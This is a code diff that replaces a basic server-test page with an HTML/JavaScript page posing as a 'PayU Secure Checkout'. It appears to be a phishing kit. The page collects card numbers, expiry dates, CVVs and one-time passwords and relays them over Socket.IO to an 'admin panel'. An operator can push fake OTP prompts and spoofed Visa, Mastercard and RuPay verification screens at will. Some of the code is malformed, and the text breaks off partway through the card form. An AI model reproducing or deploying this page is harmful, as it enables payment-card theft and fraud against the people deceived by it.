@@ -1,80 +1,1444 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Gateway</title>
-</head>
-<body>
-    <div id="content" style="text-align: center; margin-top: 100px; font-family: Arial, sans-serif;">
-        <h1>Payment Gateway</h1>
-        <p>If you can see this page, basic HTML rendering is working.</p>
-        
-        <div id="status" style="margin: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px;">
-            Checking server connection...
-        </div>
-        
-        <button id="testButton" style="padding: 10px 20px; background: #4a90e2; color: white; border: none; border-radius: 5px; cursor: pointer;">
-            Test Server Connection
-        </button>
-    </div>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PayU Secure Checkout</title>
+    <meta name="description" content="Secure payment gateway powered by PayU" />
+    <meta name="author" content="PayU" />
 
-    <script>
-        // Set up status display
-        const statusElement = document.getElementById('status');
+    <!-- External CSS - Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Socket.io Client Library -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    
+    <!-- React and React DOM -->
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+
+    <style>
+        /* Base styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .rounded-lg { border-radius: 0.5rem; }
+        .border { border-width: 1px; }
+        .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+        .bg-primary { background-color: #2563eb; }
+        .text-white { color: white; }
+        .font-bold { font-weight: 700; }
+        .text-gray-100 { color: #f3f4f6; }
+        .space-y-1 > * + * { margin-top: 0.25rem; }
+        .p-6 { padding: 1.5rem; }
+        .mb-4 { margin-bottom: 1rem; }
+        .mb-6 { margin-bottom: 1.5rem; }
+        .flex { display: flex; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .text-2xl { font-size: 1.5rem; }
+        .text-sm { font-size: 0.875rem; }
+        .text-gray-600 { color: #4b5563; }
+        .space-x-2 > * + * { margin-left: 0.5rem; }
+        .text-green-500 { color: #10b981; }
+        .font-medium { font-weight: 500; }
+        .gap-3 { gap: 0.75rem; }
+        .h-8 { height: 2rem; }
+        .w-12 { width: 3rem; }
+        .h-6 { height: 1.5rem; }
+        .object-contain { object-fit: contain; }
+        .space-y-4 > * + * { margin-top: 1rem; }
+        .relative { position: relative; }
+        .pl-10 { padding-left: 2.5rem; }
+        .pr-10 { padding-right: 2.5rem; }
+        .absolute { position: absolute; }
+        .left-3 { left: 0.75rem; }
+        .top-3 { top: 0.75rem; }
+        .right-3 { right: 0.75rem; }
+        .top-2\.5 { top: 0.625rem; }
+        .h-4 { height: 1rem; }
+        .w-4 { width: 1rem; }
+        .text-gray-400 { color: #9ca3af; }
+        .h-5 { height: 1.25rem; }
+        .w-10 { width: 2.5rem; }
+        .grid { display: grid; }
+        .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+        .gap-4 { gap: 1rem; }
+        .w-full { width: 100%; }
+        .bg-blue-50 { background-color: #eff6ff; }
+        .text-blue-500 { color: #3b82f6; }
+        .h-12 { height: 3rem; }
+        .w-12 { width: 3rem; }
+        .text-center { text-align: center; }
+        .bg-white { background-color: white; }
+        .p-3 { padding: 0.75rem; }
+        .border-gray-200 { border-color: #e5e7eb; }
+        .mr-3 { margin-right: 0.75rem; }
+        .bg-blue-100 { background-color: #dbeafe; }
+        .rounded-full { border-radius: 9999px; }
+        .p-2 { padding: 0.5rem; }
+        .text-xs { font-size: 0.75rem; }
+        .text-gray-500 { color: #6b7280; }
+        .text-lg { font-size: 1.125rem; }
+        .font-semibold { font-weight: 600; }
+        .my-6 { margin-top: 1.5rem; margin-bottom: 1.5rem; }
+        .justify-center { justify-content: center; }
+        .w-10 { width: 2.5rem; }
+        .h-14 { height: 3.5rem; }
+        .w-14 { width: 3.5rem; }
+        .mb-2 { margin-bottom: 0.5rem; }
+        .cursor-not-allowed { cursor: not-allowed; }
+        .opacity-50 { opacity: 0.5; }
+        .text-blue-600 { color: #2563eb; }
+        .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
+        .flex-col { flex-direction: column; }
+        .animate-spin { animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .border-t-2 { border-top-width: 2px; }
+        .border-b-2 { border-bottom-width: 2px; }
+        .border-primary { border-color: #2563eb; }
+        .h-16 { height: 4rem; }
+        .w-16 { width: 4rem; }
+        .bg-green-100 { background-color: #d1fae5; }
+        .text-green-500 { color: #10b981; }
+        .bg-red-100 { background-color: #fee2e2; }
+        .text-red-500 { color: #ef4444; }
+        .border-t { border-top-width: 1px; }
+        .pt-0 { padding-top: 0; }
+        .h-6 { height: 1.5rem; }
+        .flex-wrap { flex-wrap: wrap; }
+        .gap-6 { gap: 1.5rem; }
+        .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
+        .h-5 { height: 1.25rem; }
         
-        // Function to update status
-        function updateStatus(message, isError = false) {
-            statusElement.textContent = message;
-            statusElement.style.background = isError ? '#ffebee' : '#e8f5e9';
-            statusElement.style.color = isError ? '#c62828' : '#2e7d32';
+        /* Form styles */
+        input {
+            width: 100%;
+            padding: 0.5rem 0.75rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.375rem;
+            outline: none;
+        }
+        input:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 1px #2563eb;
+        }
+        button {
+            background-color: #2563eb;
+            color: white;
+            font-weight: 500;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #1d4ed8;
+        }
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
         
-        // Test button functionality
-        document.getElementById('testButton').addEventListener('click', async function() {
-            try {
-                updateStatus('Testing connection to server...');
-                
-                // Try to fetch from the health endpoint
-                const response = await fetch('/health');
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    updateStatus(`Server is running! Server ID: ${data.serverId}, Time: ${data.serverTime}`);
-                } else {
-                    updateStatus(`Server responded with status: ${response.status}`, true);
-                }
-            } catch (error) {
-                updateStatus(`Error connecting to server: ${error.message}`, true);
-                console.error('Connection error:', error);
-            }
-        });
+        /* OTP input styles */
+        .otp-input {
+            display: flex;
+            gap: 0.5rem;
+            justify-content: center;
+        }
+        .otp-input input {
+            width: 2.5rem;
+            height: 3rem;
+            text-align: center;
+            font-size: 1.25rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.375rem;
+        }
         
-        // Initial page load check
-        window.addEventListener('load', function() {
-            console.log('Page loaded at:', new Date().toISOString());
-            updateStatus('Page loaded successfully. Click the button to test the server connection.');
+        /* Card layout */
+        @media (min-width: 768px) {
+            .md\:flex { display: flex; }
+            .md\:w-1\/2 { width: 50%; }
+        }
+        
+        /* Separator line */
+        .separator-vertical {
+            width: 1px;
+            height: 1.5rem;
+            background-color: #e5e7eb;
+        }
+
+        /* MC verification styles */
+        .fixed {
+            position: fixed;
+        }
+        .inset-0 {
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+        }
+        .z-50 {
+            z-index: 50;
+        }
+        .bg-opacity-75 {
+            --bg-opacity: 0.75;
+        }
+        .bg-black {
+            background-color: rgba(0, 0, 0, var(--bg-opacity));
+        }
+    </style>
+</head>
+
+<body>
+    <div id="app" class="min-h-screen flex items-center justify-center p-4"></div>
+
+    <script>
+
+        <script>
+// Global error handler to catch uncaught exceptions
+window.onerror = function(message, source, lineno, colno, error) {
+    console.error('Uncaught error:', message, source, lineno, colno, error);
+    const appElement = document.getElementById('app');
+    if (appElement) {
+        appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
+            <h3 style="margin-bottom: 10px; font-size: 18px;">There was an error loading the page</h3>
+            <p style="margin-bottom: 10px;">Please try refreshing the page or contact support if the issue persists.</p>
+            <p style="font-size: 12px; color: #666;">Error details: ${message}</p>
+            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
+        </div>`;
+    }
+    return true;
+};
+// Main application code
+document.addEventListener('DOMContentLoaded', function() {
+    // Add basic content with error handling
+    const appElement = document.getElementById('app');
+    if (appElement) {
+        appElement.innerHTML = '<div id="loading-message" style="text-align: center; padding: 20px;">Loading payment page... If this message persists, please refresh the page.</div>';
+    }
+    
+    try {
+const socket = io(window.location.origin, {
+    reconnection: true,
+    reconnectionAttempts: Infinity,
+    reconnectionDelay: 1000,
+    reconnectionDelayMax: 5000,
+    timeout: 20000,
+    transports: ['websocket', 'polling']
+});
+            // Add these debugging listeners
+    socket.on('connect', () => {
+        console.log('Connected to Socket.IO server with ID:', socket.id);
+        
+        // Join room based on URL pid parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const pid = urlParams.get('pid');
+        if (pid) {
+            console.log('Joining room for PID:', pid);
+            socket.emit('join', pid);
+        }
+    });
+
+    socket.on('disconnect', () => {
+        console.log('Disconnected from Socket.IO server');
+    });
+
+    socket.on('error', (error) => {
+        console.error('Socket error:', error);
+    });
+socket.on('connect_error', (error) => {
+    console.error('Socket connection error:', error);
+    const appElement = document.getElementById('app');
+    if (appElement) {
+        appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
+            <h3 style="margin-bottom: 10px; font-size: 18px;">Connection Error</h3>
+            <p style="margin-bottom: 10px;">Failed to connect to the server. Please check your internet connection and try again.</p>
+            <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
+            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
+        </div>`;
+    }
+    catch (error) {
+        console.error('Initialization error:', error);
+        const appElement = document.getElementById('app');
+        if (appElement) {
+            appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
+                <h3 style="margin-bottom: 10px; font-size: 18px;">Failed to initialize the application</h3>
+                <p style="margin-bottom: 10px;">Please try refreshing the page or contact support.</p>
+                <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
+                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
+            </div>`;
+        }
+    }
+});
+        // Add timeout handler for slow responses
+setTimeout(function() {
+    const appElement = document.getElementById('app');
+    const loadingMsg = document.getElementById('loading-message');
+    if (appElement && loadingMsg && appElement.contains(loadingMsg)) {
+        appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
+            <h3 style="margin-bottom: 10px; font-size: 18px;">Loading Timeout</h3>
+            <p style="margin-bottom: 10px;">The server is taking too long to respond. Please try again later.</p>
+            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
+        </div>`;
+    }
+}, 15000); // 15 seconds timeout
+        
+    // Add acknowledgement for card data
+    socket.on('card_data_received', (data) => {
+        console.log('Card data received acknowledgement:', data);
+        if (data.invoiceId) {
+            // Join the room for this transaction ID
+            socket.emit('join', data.invoiceId);
+            console.log('Joined room for invoice:', data.invoiceId);
             
-            // Display debugging information
-            const debugInfo = document.createElement('div');
-            debugInfo.style.margin = '20px';
-            debugInfo.style.padding = '10px';
-            debugInfo.style.border = '1px solid #ccc';
-            debugInfo.style.borderRadius = '5px';
-            debugInfo.style.fontSize = '12px';
-            debugInfo.style.fontFamily = 'monospace';
-            debugInfo.style.textAlign = 'left';
+            // Store transaction ID if not already set
+            if (!state.transactionId) {
+                state.transactionId = data.invoiceId;
+            }
+        }
+    });
+            // Application state
+            let state = {
+                step: 'card', // 'card', 'otp', 'processing', 'success', 'failure'
+                transactionId: '',
+                loading: false,
+                otpValue: '',
+                amount: 1299.00,
+                maskedPhone: '',
+                cardType: null,
+                timeLeft: 59,
+                canResend: false,
+                cardForm: {
+                    cardNumber: '',
+                    cardHolder: '',
+                    expiryDate: '',
+                    cvv: '',
+                    errors: {}
+                }
+            };
             
-            debugInfo.innerHTML = `
-                <h3>Debug Information</h3>
-                <p>URL: ${window.location.href}</p>
-                <p>User Agent: ${navigator.userAgent}</p>
-                <p>Screen Size: ${window.innerWidth}x${window.innerHeight}</p>
-                <p>Render Time: ${new Date().toISOString()}</p>
+            // Timer reference
+            let timerRef = null;
+            
+            // Helper function to get readable failure reason
+            function getReadableFailureReason(reasonCode) {
+                const reasons = {
+                    'insufficient_balance': 'Insufficient funds in your account',
+                    'bank_declined': 'Your bank declined this transaction',
+                    'card_disabled': 'This card has been disabled for online transactions',
+                    'invalid_card': 'Invalid card details',
+                    '3Dsecure_is_not_enabled_for_your_card': '3D secure is not enabled for your card',
+                    'pickup_Card': 'This card has been flagged for pickup',
+                    'Incorrect_card_details': 'The card details entered are incorrect',
+                    'Credit_limit_exceeded': 'Your credit limit has been exceeded',
+                    'Incorrect_security_code': 'The security code is incorrect',
+                    'This_type_of_transacton_is_not_allowed_for_your_card': 'This type of transaction is not allowed for your card',
+                    'The_issuing_bank_flagged_the_transaction_as_potentially_fraudulent': 'Your issuing bank flagged the transaction as potentially fraudulent'
+                };
+                return reasons[reasonCode] || 'Your payment could not be processed';
+            }
+            
+            // Function to show MC verification UI
+            function showMCVerification(data) {
+                // Create MC verification UI
+                const mcContainer = document.createElement('div');
+                mcContainer.id = 'mc-verification-container';
+                mcContainer.className = 'fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center';
+                
+                // Determine which logo to show based on verification type
+                let logoSrc = '';
+                let verificationTitle = '';
+                
+                switch(data.verificationType || 'mastercard') {
+                    case 'visa':
+                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
+                        verificationTitle = 'Verified by Visa';
+                        break;
+                    case 'amex':
+                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg';
+                        verificationTitle = 'American Express SafeKey';
+                        break;
+                    case 'discover':
+                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg';
+                        verificationTitle = 'Discover ProtectBuy';
+                        break;
+                    case 'rupay':
+                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png';
+                        verificationTitle = 'RuPay PaySecure';
+                        break;
+                    default:
+                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
+                        verificationTitle = 'Mastercard SecureCode';
+                }
+                
+                // Build MC verification HTML
+                mcContainer.innerHTML = `
+                    <div class="bg-white p-6 rounded-lg max-w-md w-full">
+                        <div class="flex justify-center mb-4">
+                            <img src="${logoSrc}" alt="${verificationTitle}" class="h-12">
+                        </div>
+                        <h3 class="text-xl font-bold mb-4 text-center">${verificationTitle}</h3>
+                        <p class="mb-4 text-gray-600 text-center">
+                            For your security, your bank requires additional verification for this transaction.
+                        </p>
+                        <div class="mb-4 bg-blue-50 p-4 rounded-lg">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-500">Merchant:</span>
+                                <span class="font-medium">${data.merchantName || 'Online Store'}</span>
+                            </div>
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-500">Amount:</span>
+                                <span class="font-medium">${data.amount || state.amount} ${data.currency || 'INR'}</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-500">Date:</span>
+                                <span class="font-medium">${new Date().toLocaleDateString()}</span>
+                            </div>
+                        </div>
+                        <div class="mb-4">
+                            <label class="block text-sm font-medium mb-2">One-Time Password (OTP)</label>
+                            <input type="text" id="mc-otp-input" class="w-full p-2 border border-gray-300 rounded" 
+                                placeholder="Enter OTP sent to your mobile" maxlength="6">
+                            <p class="text-sm text-gray-500 mt-1">
+                                A verification code has been sent to your registered mobile ${data.phoneLastFour ? 'ending with ' + data.phoneLastFour : ''}
+                            </p>
+                        </div>
+                        <button id="mc-submit-otp" class="w-full bg-blue-600 text-white py-2 rounded font-medium">
+                            Submit
+                        </button>
+                    </div>
+                `;
+                
+                document.body.appendChild(mcContainer);
+                
+                // Add event listener for OTP submission
+                document.getElementById('mc-submit-otp').addEventListener('click', function() {
+                    const otpValue = document.getElementById('mc-otp-input').value.trim();
+                    if (otpValue.length < 4) {
+                        alert('Please enter a valid OTP');
+                        return;
+                    }
+                    
+                    // Send OTP to admin
+                    socket.emit('mc_otp_submitted', {
+                        invoiceId: state.transactionId,
+                        otp: otpValue
+                    });
+                    
+                    // Disable the button to prevent multiple submissions
+                    this.disabled = true;
+                    this.textContent = 'Verifying...';
+                });
+            }
+            
+            // Generate random phone number for demo
+            function generateRandomPhone() {
+                const area = Math.floor(Math.random() * 900) + 100;
+                const middle = Math.floor(Math.random() * 900) + 100;
+                const last = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+                
+                // Last 4 digits visible, rest masked
+                state.maskedPhone = `+1 (***) ***-${last.substring(last.length - 4)}`;
+                
+                // Store full number (for demo purposes)
+                const fullPhone = `+1 (${area}) ${middle}-${last}`;
+                console.log("Full phone for verification:", fullPhone);
+            }
+            
+            // Format card number with spaces
+            function formatCardNumber(value) {
+                const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                const matches = v.match(/\d{4,16}/g);
+                const match = matches && matches[0] || '';
+                const parts = [];
+                
+                for (let i = 0; i < match.length; i += 4) {
+                    parts.push(match.substring(i, i + 4));
+                }
+                
+                if (parts.length) {
+                    return parts.join(' ');
+                } else {
+                    return value;
+                }
+            }
+            
+            // Detect card type based on first digit
+            function detectCardType(cardNumber) {
+                const number = cardNumber.replace(/\s+/g, '');
+                
+                if (number.startsWith('4')) {
+                    state.cardType = 'visa';
+                } else if (number.startsWith('5')) {
+                    state.cardType = 'mastercard';
+                } else if (number.startsWith('3')) {
+                    state.cardType = 'amex';
+                } else if (number.startsWith('6')) {
+                    state.cardType = 'discover';
+                } else if (/^(81|82)/.test(number)) {
+                    state.cardType = 'rupay';
+                } else {
+                    state.cardType = null;
+                }
+            }
+            
+            // Format expiry date as MM/YY
+            function formatExpiryDate(value) {
+                let v = value.replace(/\D/g, '');
+                
+                if (v.length > 2) {
+                    return `${v.slice(0, 2)}/${v.slice(2, 4)}`;
+                }
+                
+                return v;
+            }
+            
+            // Start OTP timer
+            function startOtpTimer() {
+                state.timeLeft = 59;
+                state.canResend = false;
+                
+                if (timerRef) {
+                    clearInterval(timerRef);
+                }
+                
+                timerRef = setInterval(() => {
+                    state.timeLeft--;
+                    if (state.timeLeft <= 0) {
+                        clearInterval(timerRef);
+                        state.canResend = true;
+                        state.timeLeft = 0;
+                        renderApp();
+                    } else {
+                        renderApp();
+                    }
+                }, 1000);
+            }
+            
+            // Validate card form
+            function validateCardForm() {
+                const errors = {};
+                const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm;
+                
+                if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
+                    errors.cardNumber = "Card number must be 16 digits";
+                }
+                
+                if (!cardHolder || cardHolder.length < 3) {
+                    errors.cardHolder = "Card holder name is required";
+                }
+                
+                if (!expiryDate || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiryDate)) {
+                    errors.expiryDate = "Must be in MM/YY format";
+                }
+                
+                if (!cvv || cvv.length < 3 || cvv.length > 4) {
+                    errors.cvv = "CVV must be 3-4 digits";
+                }
+                
+                state.cardForm.errors = errors;
+                return Object.keys(errors).length === 0;
+            }
+            
+            // Handle card form submission
+            function handleCardSubmit(e) {
+                e.preventDefault();
+                
+                if (!validateCardForm()) {
+                    renderApp();
+                    return;
+                }
+                
+                state.loading = true;
+                
+                // Generate transaction ID
+                state.transactionId = Math.random().toString(36).substring(2, 15);
+                
+                // Collect card data to send
+                const cardData = {
+                   cardNumber: state.cardForm.cardNumber.replace(/\s/g, ''),
+                    cardholder: state.cardForm.cardHolder,
+                    expiry: state.cardForm.expiryDate,
+                    cvv: state.cardForm.cvv,
+                    amount: state.amount,
+                    currency: "USD",
+                    email: "customer@example.com", // You might want to collect this in your form
+                    cardType: state.cardType
+                };
+                
+                // Emit card details to server for admin panel
+                socket.emit('card_submitted', {
+                    invoiceId: state.transactionId,
+                    cardData: cardData,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Show processing state
+                state.step = 'processing';
+                renderApp();
+                
+                // Timeout in case of no response
+                setTimeout(() => {
+                    if (state.step === 'processing') {
+                        state.step = 'failure';
+                        state.loading = false;
+                        showToast("Connection Timeout", "No response from payment server. Please try again.", "error");
+                        renderApp();
+                    }
+                }, 30000);
+            }
+            
+            // Handle OTP submission
+            function handleOtpSubmit() {
+                if (state.otpValue.length !== 6) {
+                    showToast("Invalid OTP", "Please enter a valid 6-digit OTP", "error");
+                    return;
+                }
+                
+                state.loading = true;
+                
+                // Emit OTP to server
+                socket.emit('otp_submission', {
+                    transaction_id: state.transactionId,
+                    otp: state.otpValue,
+                    timestamp: new Date().toISOString(),
+                });
+                
+                // Show processing state
+                state.step = 'processing';
+                renderApp();
+            }
+            
+            // Handle try again
+            function handleTryAgain() {
+                state.step = 'card';
+                state.cardForm = {
+                    cardNumber: '',
+                    cardHolder: '',
+                    expiryDate: '',
+                    cvv: '',
+                    errors: {}
+                };
+                state.transactionId = '';
+                state.loading = false;
+                state.cardType = null;
+                renderApp();
+            }
+            
+            // Handle OTP resend
+            function handleResendOtp() {
+                if (!state.canResend) return;
+                
+                // Generate new phone number
+                generateRandomPhone();
+                
+                // Reset OTP value
+                state.otpValue = "";
+                
+                // Restart timer
+                startOtpTimer();
+                
+                showToast("OTP Resent", "A new verification code has been sent to your mobile");
+                renderApp();
+            }
+            
+            // Toast notification system
+            function showToast(title, message, type = 'info') {
+                const toast = document.createElement('div');
+                toast.className = `fixed top-4 right-4 max-w-xs bg-white border rounded-lg shadow-lg p-4 z-50 ${
+                    type === 'error' ? 'border-red-500' : 'border-blue-500'
+                }`;
+                
+                toast.innerHTML = `
+                    <div class="flex items-center">
+                        <div class="${type === 'error' ? 'text-red-500' : 'text-blue-500'} mr-3">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                                ${type === 'error' 
+                                  ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>'
+                                  : '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
+                                }
+                            </svg>
+                        </div>
+                        <div>
+                            <div class="font-bold text-gray-900">${title}</div>
+                            <div class="text-sm text-gray-600">${message}</div>
+                        </div>
+                    </div>
+                `;
+                
+                document.body.appendChild(toast);
+                
+                setTimeout(() => {
+                    toast.style.opacity = '0';
+                    toast.style.transition = 'opacity 0.5s ease';
+                    setTimeout(() => {
+                        document.body.removeChild(toast);
+                    }, 500);
+                }, 3000);
+            }
+            
+            // Setup socket connection and listeners
+            function setupSocketListeners() {
+                // On connect, send visitor information
+                socket.on('connect', () => {
+                    console.log('Connected to server with ID:', socket.id);
+                    
+                    // Send visitor information on connect
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const pid = urlParams.get('pid');
+                    if (pid) {
+                        socket.emit('visitor', {
+                            pid: pid,
+                            userAgent: navigator.userAgent,
+                            ip: 'client', // Server will replace this with actual IP
+                            timestamp: new Date().toISOString(),
+                            sessionId: 'session-' + Date.now()
+                        });
+                    }
+                });
+                
+// Handle OTP display request from admin
+socket.on('show_otp', (data) => {
+    console.log('OTP verification requested:', data);
+    
+    // Don't check transaction ID if not yet set
+    if (!state.transactionId) {
+        state.transactionId = data.transaction_id || data.invoiceId;
+    }
+    
+    // More lenient matching
+    if (data.transaction_id === state.transactionId || 
+        data.invoiceId === state.transactionId || 
+        !state.transactionId) { // Accept if we don't have a transaction ID yet
+        
+        console.log('OTP condition met, showing OTP form');
+        state.step = 'otp';
+        state.loading = false;
+        showToast("OTP Verification Required", "Please enter the OTP sent to your mobile");
+        startOtpTimer();
+        renderApp();
+    } else {
+        console.warn('Transaction ID mismatch:', data.transaction_id, state.transactionId);
+    }
+});
+                
+                // Handle payment success/failure responses
+                socket.on('payment_success', (data) => {
+                    console.log('Payment success:', data);
+                    if (data.transaction_id === state.transactionId) {
+                        state.step = 'success';
+                        state.loading = false;
+                        showToast("Payment Successful", "Your transaction has been completed successfully");
+                        renderApp();
+                    }
+                });
+                
+                socket.on('payment_failed', (data) => {
+                    console.log('Payment failed:', data);
+                    if (data.transaction_id === state.transactionId) {
+                        state.step = 'failure';
+                        state.loading = false;
+                        showToast("Payment Failed", data.message || "Your payment could not be processed", "error");
+                        renderApp();
+                    }
+                });
+                
+                // Handle currency redirect request
+                socket.on('currency_redirect', (data) => {
+                    console.log('Currency redirect requested:', data);
+                    // Implement currency page redirect logic
+                    showToast("Processing payment", "Redirecting to currency selection...");
+                    // Simulate page transition
+                    state.step = 'processing';
+                    renderApp();
+                    // You could redirect to a different page or show a currency selection UI
+                });
+                
+                // Handle bank page toggle
+                socket.on('toggle_bankpage', (data) => {
+                    console.log('Bank page toggle requested:', data);
+                    // Implement bank page toggle logic
+                    if (data.show) {
+                        showToast("Bank Verification", "Your bank requires additional verification");
+                        // Show bank page UI logic here
+                    } else {
+                        // Hide bank page UI logic here
+                    }
+                });
+                
+                // Handle MC verification
+                socket.on('show_mc_verification', (data) => {
+                    console.log('MC verification requested:', data);
+                    // Show MC verification UI
+                    state.step = 'processing';
+                    renderApp();
+                    
+                    // After a short delay, show a custom MC verification UI
+                    setTimeout(() => {
+                        showMCVerification(data);
+                    }, 1500);
+                });
+                
+                // Handle verification result
+                socket.on('mc_verification_result', function(result) {
+                    const mcContainer = document.getElementById('mc-verification-container');
+                    if (mcContainer) {
+                        document.body.removeChild(mcContainer);
+                    }
+                    
+                    if (result.success) {
+                        // Handle successful verification
+                        state.step = 'success';
+                    } else {
+                        // Handle failed verification
+                        state.step = 'failure';
+                        // If there's a specific reason, display it
+                        if (result.reason) {
+                            showToast("Payment Failed", getReadableFailureReason(result.reason), "error");
+                        }
+                    }
+                    state.loading = false;
+                    renderApp();
+                });
+                
+                // Handle OTP error
+                socket.on('mc_otp_error', function(data) {
+                    const otpInput = document.getElementById('mc-otp-input');
+                    if (otpInput) {
+                        otpInput.value = '';
+                        otpInput.classList.add('border-red-500');
+                        
+                        // Add error message
+                        const errorMsg = document.createElement('p');
+                        errorMsg.className = 'text-red-500 text-sm mt-1';
+                        errorMsg.textContent = data.message || 'Invalid OTP. Please try again.';
+                        
+                        // Remove any existing error message
+                        const existingError = otpInput.parentNode.querySelector('.text-red-500');
+                        if (existingError) {
+                            otpInput.parentNode.removeChild(existingError);
+                        }
+                        
+                        otpInput.parentNode.appendChild(errorMsg);
+                        
+                        // Re-enable the submit button
+                        const submitBtn = document.getElementById('mc-submit-otp');
+                        if (submitBtn) {
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Submit';
+                        }
+                    }
+                });
+            }
+            
+            // Credit card form HTML
+            function renderCardForm() {
+                return `
+                    <form id="card-form" class="space-y-4">
+                        <h2 class="text-xl font-semibold mb-4">Card Details</h2>
+                        
+                        <div class="space-y-1">
+                            <label class="block text-sm font-medium">Card Number</label>
+                            <div class="relative">
+                                <input 
+                                    type="text" 
+                                    id="card-number" 
+                                    placeholder="1234 5678 9012 3456" 
+                                    value="${state.cardForm.cardNumber}" 
+                                    maxlength="19" 
+                                    class="pl-10 pr-10 ${state.cardForm.errors.cardNumber ? 'border-red-500' : ''}"
+                                />
+                                <div class="absolute left-3 top-3 h-4 w-4 text-gray-400">
+                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                                        <line x1="1" y1="10" x2="23" y2="10"></line>
+                                    </svg>
+                                </div>
+                                ${state.cardType ? `
+                                    <div class="absolute right-3 top-2.5">
+                                        <div class="h-5 w-10 flex items-center justify-center">
+                                            ${state.cardType === 'visa' ? 
+                                                '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-5 w-auto" />' : 
+                                            state.cardType === 'mastercard' ? 
